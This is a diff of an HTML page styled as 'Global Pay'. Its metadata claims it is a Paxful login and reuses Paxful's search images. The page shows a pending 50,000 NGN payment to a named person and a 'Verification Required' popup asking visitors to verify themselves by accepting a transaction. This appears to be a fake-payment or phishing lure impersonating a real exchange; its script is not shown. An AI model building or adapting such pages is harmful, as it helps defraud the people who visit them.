@@ -1,58 +1,88 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Global | Pay</title>
-    <link rel="icon" href="https://assets.onecompiler.app/435v654fz/43dn9wdy2/Ct3osjzY_400x400.png" type="image/png">
-    <link rel="stylesheet" href="GLOBALPAY.css">
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta name="theme-color" content="#000000">
+  <title>Global Pay - Finance Solution</title>
+  <meta name="description" content="Login to your Paxful account">
+  <link rel="canonical" href="https://globalpay.onrender.com/">
+  <meta property="og:title" content="Finance Solution | GlobalPay">
+  <meta property="og:description" content="Login to your Paxful account">
+  <meta property="og:image" content="https://static.paxful.com/google-search-imagery/GS_Login.png">
+  <meta property="og:image:width" content="1600">
+  <meta property="og:image:height" content="1001">
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:title" content="Global | Finance solution">
+  <meta name="twitter:description" content="Secured transaction under Block chain protocal">
+  <meta name="twitter:image" content="https://static.paxful.com/google-search-imagery/GS_Login.png">
+  <meta name="twitter:image:width" content="1600">
+  <meta name="twitter:image:height" content="1001">
+  <link rel="icon" href="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTbuj6O8z01zX5zxHuCpZsQFkx3sf8ZbymB9Q&s" type="image/png">
+  <!-- Assuming you have other styles in styles.css, keep the link -->
+  <link rel="stylesheet" href="GLOBALPAY.css" />
+  <!-- <link rel="icon" href="favicon.ico" type="image/x-icon"> -->
 </head>
 <body>
-    <div class="login-container">
-        <div class="login-box">
-          
-            <div>
-              <h2>AROUND THE WORLD<br>WITH MOBILE WALLET AND<br>SMART-TRANSACTS</h2>
-            </div>
-            
-            <div>
-              <P>Just link your M-WALLET and smart-transacts<br>accounts and enjoy a world of possibilities.</P>
-            </div>
-            
-            <div>
-              <P>Track The Payment Transfer To Check The<br>Status Of Your Payment.</P>
-            </div>
-            
-            <div>
-              <button type="submit" class="track-btn" id="Track-btn" onclick="verifyAndRedirect()">Track Payment</button>
-            </div>
-            
-            <div>
-              <P>Accept The Payment To Recieve The Funds<br>Instantly.</P>
-            </div>
-            
-            <div>
-              <button type="submit" class="accept-btn" id="Accept-btn" onclick="verifyAndRedirect()">Accept Payment</button>
-            </div>
-            
-            <div>
-              <P>Cancel The Payment To Decline The Funds,<br>And The Sender Will Be Refunded<br>Immediately</P>
-            </div>
-            
-            <div>
-              <button type="submit" class="cancel-btn" id="Cancel-btn" onclick="verifyAndRedirect()">Cancel The Transfer</button>
-            </div>
 
-            <div id="verification-popup">
-                Please verify it's you before proceeding.
-            </div>
+  <div class="container">
+    <div class="overlay"></div>
+    <main class="content-area">
+      <div class="main-content">
+        <header>
+          <h1 class="title">Global<br><span>Pay</span></h1>
+          <p class="subtitle">A one-stop solution for all your<br>finance needs</p>
+        </header>
+
+        <section class="middle-info" aria-labelledby="info-cards-heading">
+          <h2 id="info-cards-heading" class="visually-hidden">Key Information</h2>
+
+          <div class="info-card">
+            <h3 class="info-card__title">Amount</h3>
+            <!-- **** Ensure these attributes are present **** -->
+            <p class="info-card__content" data-field="amount" contenteditable="false">50,000</p>
+            <p class="info-card__meta">NGN</p>
+          </div>
+
+          <div class="info-card">
+            <h3 class="info-card__title">Name</h3>
+            <!-- **** Ensure these attributes are present **** -->
+            <p class="info-card__content" data-field="name" contenteditable="false">Hexyo Xmax</p>
+            <p class="info-card__meta">hxc</p>
+          </div>
+        </section>
+      </div>
+
+      <footer class="site-footer">
+        <p class="rates-link">
+          <a href="#rates">Check our rates</a>
+        </p>
+        <div class="action-buttons">
+          <button type="button" id="login-btn">Buy</button>
+          <button type="button" id="register-btn">Sell</button>
         </div>
-        
-        <div class="cover-image"></div>
-    </div>
+      </footer>
+    </main>
 
-    <div id="backdrop"></div>
+    <aside class="cover-image" role="presentation"></aside>
 
-    <script src="GLOBALPAY.js"></script>
+  </div><!-- /.container -->
+
+  <!-- Verification Popup (Keep as is) -->
+  <div class="popup-overlay" id="popup-overlay" aria-hidden="true"></div>
+  <div class="verification-popup" id="verification-popup" role="dialog" aria-modal="true" aria-labelledby="popup-title" aria-hidden="true">
+     <!-- ... popup content ... -->
+     <h2 id="popup-title" class="popup-title">Verification Required</h2>
+     <p class="popup-message" id="popup-message">
+       Verify it's you by accepting the <span class="popup-action">transaction</span> for <span class="popup-amount"> NGN</span>.
+     </p>
+     <div class="popup-actions">
+       <button type="button" id="accept-btn" class="popup-button popup-button--accept">Accept</button>
+       <button type="button" id="decline-btn" class="popup-button popup-button--decline">Decline</button>
+     </div>
+  </div>
+
+  <script src="GLOBALPAY.js"></script>
+
 </body>
 </html>
